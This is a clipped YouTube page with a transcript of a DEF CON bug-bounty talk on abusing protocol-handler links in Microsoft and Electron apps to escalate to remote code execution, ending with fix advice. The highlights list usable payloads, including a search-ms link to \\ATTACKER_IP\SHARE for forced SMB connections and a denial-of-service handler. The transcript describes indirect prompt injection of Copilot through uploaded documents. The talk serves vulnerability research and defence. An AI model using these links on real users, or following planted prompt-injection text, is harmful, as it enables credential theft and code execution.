---
title: "\"easiest RCE payload ever\"  | DEF CON 34 | BBV Talk"
Type: "Video"
published: 2026-09-14
Source: "https://www.youtube.com/watch?v=shbDdMbXInE"
Creator: "[[Bug Bounty DEFCON]]"
date: 2026-09-14
tags:
  - "Clippings"
  - "Video"
Finished: false
Cover: "https://www.youtube.com/img/desktop/yt_1200.png"
Site: "YouTube"
---
## Highlights

`ms-calculator://` -> Opens Calculator
`search-ms://` -> Opens Windows Explorer
`ms-cxh-full://` -> Fucks Windows (DOS if excuted blackscreen will appear and wont go until restart)
`sftp://` -> sftp idk about what this shoit can do but definitely smth good
`search-ms://?crumb=location:\\ATTACKER_IP\SHARE` -> make victim connect to attacker server

---
## Full Page Content

![](https://www.youtube.com/watch?v=shbDdMbXInE)

Your Low-severity kudos may be a High payout in disguise.  
  
At DEF CON 34’s Bug Bounty Village, Tobias Diehl breaks down what he calls “the easiest payload you’ll see all of DEF CON”: using a simple sftp:// link as a canary for a vulnerable app.  
  
What's protected by the "Open this application? prompt on web can become far more dangerous when it crosses into a desktop app with OS-level controls.  
  
Tobias walks through multiple real-world examples — including Copilot, Power Apps, Power Automate Desktop, and WinSCP — to show how protocol handlers, misconfigured Electron/WebView2-style apps, and unsafe desktop handoffs can turn a minor URL issue into an obvious high-severity remote code execution on a victim's machine.  
  
You’ll see:  
  
\- Why sftp:// is such a fast litmus test for weak URL-scheme validation  
\- Where exactly bug bounty hunters give up too early  
\- How to think about web → desktop escalation  
\- Why the same bug can jump from roughly $100 territory to a $15K RCE payout  
\- How this research class has generated $60K+ across Microsoft applications  
  
The payload is simple. The real skill is recognizing where to push next.

## Transcript

**0:03** · \[music\] Hi everybody, my name is Tobias Deal. I currently work as a senior offensive security engineer in the financial industry where I mostly red team and purple team, but I also really like messing around with bug bounties and I mostly hunt on Microsoft's program. If you would like to connect with me, here's my LinkedIn, GitHub, find me on there. Always like to talk to other bug bounty hunters.

**0:30** · Today I want to talk to you about an issue that often gets lost in translation. And I see a lot of bug bounty hunters stopping at an escalation point where we can often push it further. But first, let's talk about some of the basics. We have to start at the operating system level. When we're taking a look at the anatomy of a link on the operating system level, there's already a few different things going on, right? At the beginning of the link, we always have HTTPS, which in this case is really the protocol handler for the operating system.

**0:58** · If you click on that, it tells the operating system, I want to start this specific default application, which is always going to be your web browser. If you click on the link, you also pass uh other parts of it, which in this case is going to be the host that you want to connect to. So if we break it down, click on clicking on this always tells the operating system the user wants to open this specific resource using this default application.

**1:25** · And there's many different types of links out there. You might have seen them, right? Mail 2, tell FTP, those are all the basic ones. But when we take a look at the overall attack surface that comes along with these protocol handlers, we start realizing that it's fairly large. Um, last I checked, there's over 300 different registered protocol handlers that can all introduce their own security vulnerabilities because when you install a new application, the developer can now add one of these protocol handlers into your registry.

**1:58** · So if we move from an operating system now into the actual web layer, that also means that we can start creating these links, right? So we create a website, we send it to the user or the user navigates to it. They click on the link. Now in a web browser, they get a prompt that says, "Do you want to start this application?" And if they go through with that, you guessed it, the application starts, right? And in browsers, that's really the security mechanism. That prompt that you see, it means that a user gesture is required before the application can start.

**2:29** · And that's really important because otherwise the internet would be a wild west, right? Sites just starting your apps.

**2:38** · But when we're looking for these unprotected URL inputs on programs, we always want to be able to show impact, right? That's one of the most important parts, right? Otherwise, who cares that a user can click on a link. But when you make the argument that a large user base is very vulnerable to this, the scope and the severity increases, right?

**3:00** · Because we're all or most of us use Windows and the operating system often ships the payload for us. So we can see search- is a good example that starts your file explorer. It's often abused for file delivery, ransomware, and those type of things. We also have MS- calculator. Of course, that starts a calculator. Who doesn't want to do that in a proof of concept?

**3:22** · And then we have some of the more exotic ones like starting the Microsoft Cloud Broker, which is really a broken registry link that's left in Windows, but when you try to start this through a link, it turns into a denial of service condition because your screen will go completely black and you can't do anything until you restart your machine. So, a good way to show impact.

**3:45** · But we can also look at thread intelligence. So when you open up one of these reports, we can reference some of the hacking groups that are out there.

**3:53** · They're already abusing these protocol handlers. So the search protocol handler is a really big example of that. Again, users are being tricked to click these links because it's a malware delivery mechanism. You can also change the title of the window. Makes it really convenient for the hacker.

**4:12** · But there's also third-party issues that get introduced. So when we have other software that the user might run like win SCP is a really big example of that.

**4:21** · They had a CVE where arbitrary commands were passed along with the protocol handler which could then lead to the host being compromised because the attacker can have them connect to a C2 or another type of connection. So why should you really care about this and how do you identify these unprotected outputs? because you want to be able to actually go to the program and say, "Hey, I added this link and I can't do something dangerous with it." So, promise you this will be the easiest payload you'll see all of Defcon.

**4:49** · But when you go to a web application or any other application, what I want you guys to start doing is start using this payload right here, SFTP. Because when you add that link, it tells us a whole lot of information about the security of the application already. If you see that this link doesn't turn into anything clickable, so the custom protocol handler doesn't change, then you have a web developer that has thought about this vulnerability.

**5:16** · They have added some kind uh some type of allow list, a block list to protect the application and you can most likely only use HTTPS or another secure one that they want to have in there.

**5:31** · If you create this link and all of a sudden the S gets dropped from the clickable link, you just have FTP. That tells us the web developer already thought about this. They have added a list. Now they only have specific links that can be added. But that means from a researcher perspective, we can start to fuzz the application to see if they maybe missed something. Can we still use some of these malicious protocol handlers to add in there?

**5:53** · If the full thing turns clickable, then you want to proceed to try to escalate it into a higher severity issue because that means now we can add any protocol handler and potentially start any application that the user has on their um desktop. And for bug bounty hunters, that's really a great technique because it turns into evergreen content. Think of it, what application do you use nowadays that doesn't have a link option, right? We can look at chat apps where we can send a user a link.

**6:24** · AI products are often output links nowadays and of course we also have deep links on mobile apps and web apps. But let's talk about an example of a web application where this issue occurred. So I hunt a lot on Microsoft's program and I really like looking into AI issues and on Microsoft's co-pilot I found out that they have a sharing feature which is fantastic for team collaboration. But while I was hunting on the program, I found out that I can upload word documents with indirect prompt injections.

**6:55** · And when that happens, the user later joins, they can no longer access the document. However, the indirect prompt injection survives. And that means that any user that now asks for this document will really receive an output from copilot that includes one of these arbitrary protocol handler links trying to redirect them to an attacker controlled link that might start an application. So the user joins asks for this they're presented with a link again. They get the prompt.

**7:24** · If they move through with it then we have a rce condition right. So, apologize about the view here, but I tried to get all the screenshots together. You can see that behavior here. I've poisoned the session. Another user joins. They now ask for the same document. And now we break out of the co-pilot protection.

**7:45** · Copilot displays an error message. The user clicks on it and gets a prompt, right? Copilot wants to redirect you to this. But then we also see in the new tab that this link actually starts in the application's context. So we can try to trick the user, spoof it and tell them, hey co-pilot actually tried to start this new application, maybe some new MCP tool and then it turns into code execution from that location.

**8:10** · Report that to Microsoft. They said yes, you can influence this output from co-pilot, but the user has to trust this conversation first before they join it.

**8:21** · And we didn't see the full rce impact on the website. So we considered as a low severity issue and as bug bounty hunters I see this often. I also saw this on hacker one and bug crowd have a few different findings on there where the same exact thing occurred. I could find a website add one of these inputs and use it as a malware delivery channel right and it always turns into a low severity finding because programs see that the browser prompt is there and they see that as a security mechanism.

**8:52** · So the user to them is already protected. they don't have to take any other action because another layer is protecting them. But that's where a lot of bug bounty hunters unfortunately right we have this input they get discouraged and now they do not want to continue through with that because well the other layer already exists right so why even push it further but that's where we need to push further we need to translate it and look at look at it from another layer syncing into well maybe a

**9:21** · desktop application so let's talk about escalating the issue between application types so let's take electron as an example example, it's a framework that makes it very simple for developers to put a website together, create a desktop application that can be installed on different operating system. But for us bug bounty hunters, that also means that um well unfortunately a lot of teams are overworked and their web team is now creating the desktop application.

**9:48** · They're just trying to package it, make the customer happy and now beautiful, we have a program that everybody can install. But that also means that the web developers are creating desktop applications and they might not know about all of the security features that come along with that. And for us that means we can look for web vulnerabilities now in a desktop application that ties to the operating system and we might be able to escalate our well issue through that bridge that exists there.

**10:15** · As an example, in Electron, if you read through the security guide, they have a very big section in there talking about shell open external and how you should never allow a user to add any kind of untrusted input into it. Well, because it can lead to executing arbitrary commands, right? Well, it can lead to user compromise.

**10:35** · So when you work with Electron applications or one of your developers does, always consider that links need to have that extra protection because it bundles it as a browser, but it doesn't have all of the same protections unless you add it yourself.

**10:50** · And when we're looking at the web to desktop application case examples here, let's go back to the previous one, right? An attacker now uh submits a malicious URL to an unprotected field.

**11:02** · The web app stores this. we're able to just add whatever we wanted as from the previous example and then unfortunately that gets synced down to other services.

**11:13** · Think of Teams, right? Teams has a web application but it also has a desktop.

**11:17** · You can't really tell which way the user is interacting with it. But now if we're the attacker and we're able to send a user one of these desktop application links and they click on it, then all of a sudden we might not have the same browser protection. And even further, if we're able to chain that together with a cross-ite scripting payload or some other JavaScript execution, we can come close to a zero-click or one-click scenario where it turns into an RCE impact. One really good example of that was Power Apps. If you're not familiar with Power Apps, Microsoft's solution.

**11:49** · It's a low code solution enabling developers to create apps for their um customers and internal teams. Makes it super simple. But they've also added co-pilot into it. And co-pilot again makes it even simpler. Right now you just prompt co-pilot say this is the application that I need. Add everything to make it functional. And boom, we have an app. But Copilot unfortunately didn't know about this protection. It didn't read the security guide for the apps that it was creating.

**12:17** · And now I could just go to C-Pilot, ask it, hey, go ahead and create one of these applications. Add one of these links.

**12:26** · And after 10 seconds, I want you to autoexecute that link. And as you can see, Copilot happily agreed to that.

**12:33** · Started to build the application. And now we can translate that from a web layer where if we test this application out, we see the prompt, right? Again, we have that protection layer that pops up that the developers was relying on. But if we translate that into the desktop application and open it up, then you guessed it. After 10 seconds, we now get a popup calculator start. We have our classic proof of concept.

**12:58** · And if you combine that with the thread intelligence that's out there, we can prove we can now create these applications that hackers might use to target users for some of these rce payloads. Fortunately, that also happened in Power Automate Desktop. So Power Automate Desktop had an automation browser where the exact same thing happened, right? You have to trick a user to go to a specific website.

**13:20** · If that website has one of these links on it that tries to load an external resource, then the link autoexecutes and now the user will um try to connect to an external SMB share where their password hash might get leaked. And keep in mind these are just a few different examples, right? Because we have this huge attack surface. So if we can also enumerate what kind of applications they might have installed, we can go for some of the more powerful examples out there like I showed you earlier with Win SCP.

**13:52** · And switching over from the $100 bug bounties when you hunt on Microsoft's program, this definitely something you want to look for because that $100 payout now turns into something much more severe. Now these issues turned into CVE issues, right? a high severity because we can trick most users by simply creating this link. And well, Microsoft's program pays pretty nicely for these rce issues.

**14:15** · So, by just creating this one simple link, you can uh jump up into the remote code execution category and it will pay you $15,000 if you submit a high severity report. I will also mention that every time the development team tries to push a fix out for it, you should always always retest because the protection might not work and Microsoft's program will pay you out if you able to bypass that.

**14:43** · So by creating these simple applications now this research has made over $60,000 by just looking at Microsoft's applications. But if you guys want to look for these, start looking at some of these desktop applications. The Electron store itself has over 300 different applications that you can take a look at and all of them might have that exact issue because developers might not be looking for that link protection. Also, you have other big programs should mention it's not just an electron issue.

**15:13** · So if you have web view 2 or some of the newer applications that are coming out, always look for these, but start with the web layer because that makes it very simple as a bug bounty hunter to just register for a new application. Pop on there. Can I create a link? Yes, this works. Now, do you have a desktop application where I can escalate that right? Don't miss that translation and don't miss out on the big payout, please. Now, when we're submitting these, we also want to talk about actually uh fixing them, right?

**15:41** · We always want to tell the developers, you want to take a look at some of the security guidelines for this framework, but you also want to make sure that you always protect the input. And it's a lot easier for a development team to have an allow list for some of these links instead of a block list because a block list means that your security team has to continuously look out for threat intelligence for new CVEes that might trigger one of these protocol handler links.

**16:10** · Also, I mentioned it before, please always make sure that you read through the security guide because there's simple misconfigurations like this that can happen that can compromise a user. Also, it is of course the shared duty. We have many different layers that these applications work on nowadays. So maybe have your teams collaborate.

**16:28** · If you have a web development team and an appseac or app development team, have them talk about some of these interactions and some of these sync actions that occur between the different applications so that can be considered during QA testing. Even something simple like a link can turn into something right. So in summary, little bit of fast talk today, but like I said, the quickest uh the easiest payload you have all of Defcon.

**16:56** · So keep in mind an unprotected URL input can be a low severity issue in web programs, but always take a look to see if they also have a desktop application cuz that's where your translation happens and the security escalation can happen. As you can see, a simple click can turn into a high payout. And always look for that prompt because we might be able to just use it as a spoofing option. Now, I hope you enjoyed that. I hope you find your own unprotected URL inputs.

**17:24** · Um, if you find any of these issues, I would love it if you can find me on LinkedIn. Let me know about it. Love to hear about your success. And I hope you have a wonderful Defcon and go click responsibly.